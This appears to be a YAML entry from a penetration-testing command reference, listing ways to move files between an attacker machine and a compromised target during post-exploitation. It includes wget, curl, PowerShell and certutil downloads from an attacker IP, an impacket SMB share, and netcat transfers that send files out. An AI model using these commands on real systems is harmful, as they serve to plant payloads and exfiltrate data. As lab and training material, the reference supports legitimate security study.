---
description: |
  Common methods to transfer files between attacker and target machines.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Python HTTP server (attacker)
  python3 -m http.server 80

  # wget (Linux target)
  wget http://10.10.14.1/file -O /tmp/file

  # curl (Linux target)
  curl http://10.10.14.1/file -o /tmp/file

  # PowerShell (Windows target)
  IWR -Uri http://10.10.14.1/file -OutFile C:\Temp\file
  (New-Object Net.WebClient).DownloadFile('http://10.10.14.1/file','C:\Temp\file')

  # certutil (Windows target)
  certutil -urlcache -f http://10.10.14.1/file C:\Temp\file

  # SMB share (attacker)
  impacket-smbserver share . -smb2support
  # Windows target: copy \\10.10.14.1\share\file C:\Temp\file

  # SCP
  scp file john@10.10.10.1:/tmp/file

  # Netcat
  # Receiver: nc -lvnp 4444 > file
  # Sender:   nc 10.10.14.1 4444 < file
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
  - SMB
  - SSH
items:
  - Shell
techniques: []
network_position:
  - Internal
  - Local
references:
  - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/exfiltration.html
---
